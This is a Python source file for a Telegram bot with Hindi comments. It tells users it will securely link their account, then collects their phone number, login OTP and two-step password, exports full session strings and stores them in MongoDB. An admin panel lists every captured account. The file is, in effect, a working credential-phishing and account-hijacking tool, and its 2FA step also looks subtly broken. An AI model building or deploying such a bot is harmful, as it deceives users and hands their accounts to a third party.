import os
import asyncio
from flask import Flask
from threading import Thread
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymongo import MongoClient

# ================= CONFIGURATION =================
API_ID = int(os.environ.get("API_ID", 12345678))  # अपनी API_ID डालें
API_HASH = os.environ.get("API_HASH", "your_api_hash")  # अपनी API_HASH डालें
BOT_TOKEN = os.environ.get("BOT_TOKEN", "your_bot_token")  # बोट टोकन डालें
MONGO_URI = os.environ.get("MONGO_URI", "your_mongodb_connection_string")  # MongoDB URL
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8993973269))  # आपकी Telegram ID
# =================================================

# MongoDB Setup
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_session_bot"]
sessions_col = db["users_sessions"]
temp_data = db["temp_states"]  # यूजर के लॉगिन प्रोसेस के दौरान अस्थायी डाटा रखने के लिए

# Flask App for 24/7 Uptime on Render
app = Flask(__name__)

@app.route('/')
def home():
    return "Telegram Multi-Account Manager Bot is Running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# Pyrogram Bot Client
bot = Client("multi_account_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- START COMMAND ---
@bot.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    user_id = message.from_user.id
    
    if user_id == ADMIN_ID:
        # एडमिन पैनल
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 टोटल लॉगिन यूजर्स देखें", callback_data="view_users")],
            [InlineKeyboardButton("🔄 रिफ्रेश", callback_data="refresh_panel")]
        ])
        await message.reply("👑 **नमस्ते एडमिन!** आपके कंट्रोल पैनल में आपका स्वागत है:", reply_markup=keyboard)
    else:
        # आम यूजर के लिए लॉगिन फ्लो शुरू करना
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 फोन नंबर से लॉगिन करें", callback_data="start_login")]
        ])
        await message.reply(
            "नमस्ते! इस बोट के जरिए आप अपना Telegram अकाउंट लिंक कर सकते हैं।\n\n"
            "सुरक्षित तरीके से शुरू करने के लिए नीचे दिए गए बटन पर क्लिक करें:", 
            reply_markup=keyboard
        )

# --- USER LOGIN PROCESS ---
@bot.on_callback_query(filters.regex("start_login"))
async def start_login_cb(client, callback: CallbackQuery):
    user_id = callback.from_user.id
    temp_data.update_one({"user_id": user_id}, {"$set": {"step": "waiting_phone"}}, upsert=True)
    await callback.message.edit_text("कृपया अपना **फोन नंबर** कंट्री कोड के साथ भेजें (उदाहरण के लिए: `+919876543210`):")

# --- TEXT MESSAGE HANDLER (FOR PHONE, OTP, 2FA) ---
@bot.on_message(filters.text & ~filters.command(["start"]))
async def message_handler(client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    state_doc = temp_data.find_one({"user_id": user_id})
    if not state_doc:
        if user_id != ADMIN_ID:
            await message.reply("कृपया शुरू करने के लिए /start दबाएं।")
        return

    step = state_doc.get("step")

    # 1. Phone Number Step
    if step == "waiting_phone":
        phone_number = text
        await message.reply("कोड भेजा जा रहा है, कृपया प्रतीक्षा करें...")
        
        try:
            # एक अस्थायी क्लाइंट बनाकर OTP भेजें
            temp_client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await temp_client.connect()
            sent_code = await temp_client.send_code(phone_number)
            
            # डेटाबेस में फोन और फोन कोड हैश सेव करें
            temp_data.update_one(
                {"user_id": user_id},
                {"$set": {
                    "step": "waiting_otp",
                    "phone_number": phone_number,
                    "phone_code_hash": sent_code.phone_code_hash
                }}
            )
            # अस्थायी क्लाइंट डिस्कनेक्ट करें
            await temp_client.disconnect()
            
            await message.reply("✅ आपके नंबर पर Telegram OTP भेज दिया गया है।\n\nकृपया वह **OTP** यहाँ भेजें (यदि अंकों के बीच स्पेस हो तो हटा दें, या जैसे आया है वैसे भेजें):")
        except Exception as e:
            await message.reply(f"❌ त्रुटि आई: {str(e)}\nकृपया सही नंबर के साथ फिर से /start दबाएं।")
            temp_data.delete_one({"user_id": user_id})

    # 2. OTP Step
    elif step == "waiting_otp":
        otp_code = text.replace(" ", "")
        phone_number = state_doc.get("phone_number")
        phone_code_hash = state_doc.get("phone_code_hash")
        
        temp_client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()
        
        try:
            await temp_client.sign_in(phone_number, phone_code_hash, otp_code)
            # अगर लॉगिन सफल रहा तो सेशन स्ट्रिंग निकालें
            session_string = await temp_client.export_session_string()
            await temp_client.disconnect()
            
            # डेटाबेस में सेशन सेव करें
            sessions_col.update_one(
                {"phone_number": phone_number},
                {"$set": {"user_id": user_id, "session_string": session_string}},
                upsert=True
            )
            temp_data.delete_one({"user_id": user_id})
            await message.reply("🎉 **बधाई हो!** आपका Telegram अकाउंट सफलतापूर्वक इस बोट से लिंक हो गया है।")
            
        except Exception as e:
            # चेक करें कि क्या 2FA (Two-Step Verification) पासवर्ड लगा हुआ है
            if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
                temp_data.update_one(
                    {"user_id": user_id},
                    {"$set": {"step": "waiting_password", "temp_client_name": f"temp_{user_id}"}}
                )
                await message.reply("🔒 आपके अकाउंट पर 2FA पासवर्ड लगा हुआ है। कृपया अपना **Two-Step Verification पासवर्ड** भेजें:")
                await temp_client.disconnect()
            else:
                await message.reply(f"❌ लॉगिन असफल: {str(e)}\nकृपया /start से दोबारा प्रयास करें।")
                await temp_client.disconnect()
                temp_data.delete_one({"user_id": user_id})

    # 3. 2FA Password Step
    elif step == "waiting_password":
        password = text
        phone_number = state_doc.get("phone_number")
        
        temp_client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()
        
        try:
            await temp_client.check_password(password)
            session_string = await temp_client.export_session_string()
            await temp_client.disconnect()
            
            sessions_col.update_one(
                {"phone_number": phone_number},
                {"$set": {"user_id": user_id, "session_string": session_string}},
                upsert=True
            )
            temp_data.delete_one({"user_id": user_id})
            await message.reply("🎉 **सफलतापूर्वक लॉगिन हो गया!** आपका अकाउंट सुरक्षित रूप से सेव कर लिया गया है।")
        except Exception as e:
            await message.reply(f"❌ गलत पासवर्ड: {str(e)}\nकृपया /start से दोबारा शुरू करें।")
            await temp_client.disconnect()
            temp_data.delete_one({"user_id": user_id})

# --- ADMIN PANEL & USER MANAGEMENT ---
@bot.on_callback_query(filters.regex("view_users") | filters.regex("refresh_panel"))
async def view_users_cb(client, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("आप एडमिन नहीं हैं!", show_alert=True)
        return
        
    all_sessions = list(sessions_col.find())
    if not all_sessions:
        await callback.message.edit_text("📭 अभी तक किसी भी यूजर ने बोट में लॉगिन नहीं किया है।", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ वापस", callback_data="refresh_panel")]]))
        return
        
    keyboard = []
    for s in all_sessions:
        phone = s.get("phone_number")
        # हर नंबर के लिए एक बटन बनाएं
        keyboard.append([InlineKeyboardButton(f"📞 {phone}", callback_data=f"manage_{phone}")])
        
    keyboard.append([InlineKeyboardButton("🔄 रिफ्रेश लिस्ट", callback_data="refresh_panel")])
    
    await callback.message.edit_text(
        f"📊 **कुल लॉगिन अकाउंट्स:** `{len(all_sessions)}`\n\nकिसी भी अकाउंट को मैनेज करने के लिए नीचे उसके नंबर पर क्लिक करें:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# जब एडमिन किसी खास नंबर पर क्लिक करे
@bot.on_callback_query(filters.regex(r"manage_"))
async def manage_account_cb(client, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
        
    phone = callback.data.split("_")[1]
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🗑️ इस अकाउंट को डिलीट/लॉगआउट करें", callback_data=f"del_{phone}")],
        [InlineKeyboardButton("⬅️ सभी यूजर्स की लिस्ट पर जाएं", callback_data="view_users")]
    ])
    
    await callback.message.edit_text(
        f"⚙️ **अकाउंट मैनेजमेंट:** `+`{phone}\n\nआप इस अकाउंट के साथ क्या करना चाहते हैं?",
        reply_markup=keyboard
    )

# अकाउंट डिलीट करने के लिए
@bot.on_callback_query(filters.regex(r"del_"))
async def delete_account_cb(client, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
        
    phone = callback.data.split("_")[1]
    sessions_col.delete_one({"phone_number": phone})
    
    await callback.answer("अकाउंट डेटाबेस से हटा दिया गया है!", show_alert=True)
    
    # वापस लिस्ट दिखाएं
    all_sessions = list(sessions_col.find())
    keyboard = [[InlineKeyboardButton(f"📞 {s.get('phone_number')}", callback_data=f"manage_{s.get('phone_number')}")] for s in all_sessions]
    keyboard.append([InlineKeyboardButton("🔄 रिफ्रेश", callback_data="refresh_panel")])
    
    await callback.message.edit_text(f"🗑️ अकाउंट हटा दिया गया।\n\nशेष अकाउंट्स:", reply_markup=InlineKeyboardMarkup(keyboard))

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # Flask सर्वर को बैकग्राउंड धागे (Thread) में चलाना ताकि Render पर पोर्ट बाइंडिंग की समस्या न हो
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("🤖 बोट शुरू हो रहा है...")
    bot.run()
